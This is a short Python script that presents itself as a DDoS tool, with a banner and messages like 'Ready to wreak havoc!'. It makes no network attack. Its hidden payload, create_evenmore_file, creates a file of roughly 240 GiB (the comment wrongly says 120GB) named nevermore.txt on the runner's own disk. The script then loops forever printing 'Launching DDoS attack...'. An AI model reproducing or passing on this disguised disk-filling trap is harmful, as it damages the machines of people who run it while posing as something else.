import time

# ASCII banner
banner = """
██████╗░░█████╗░███╗░░░███╗███████╗███╗░░██╗██╗███╗░░██╗░██████╗
██╔══██╗██╔══██╗████╗░████║██╔════╝████╗░██║██║████╗░██║██╔════╝
██║░░██║██║░░██║██╔████╔██║█████╗░░██╔██╗██║██║██╔██╗██║╚█████╗░
██║░░██║██║░░██║██║╚██╔╝██║██╔══╝░░██║╚████║██║██║╚████║░╚═══██╗
██████╔╝╚█████╔╝██║░╚═╝░██║███████╗██║░╚███║██║██║░╚███║██████╔╝
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚══════╝╚═╝░░╚══╝╚═╝╚═╝░░╚══╝╚═════╝░
"""

def create_evenmore_file():
    file_path = "./nevermore.txt"
    with open(file_path, "wb") as file:
        file.seek(240 * 1024 * 1024 * 1024)  # Seek to 120GB
        file.write(b"\0")  # Write null bytes to fill the file

def pretend_ddos_tool():
    while True:
        print("Launching DDoS attack...")

if __name__ == "__main__":
    print(banner)
    print("Welcome to the DDoS tool!")
    time.sleep(2)
    print("Initializing...")
    time.sleep(2)
    print("Ready to wreak havoc!")
    create_evenmore_file()
    pretend_ddos_tool()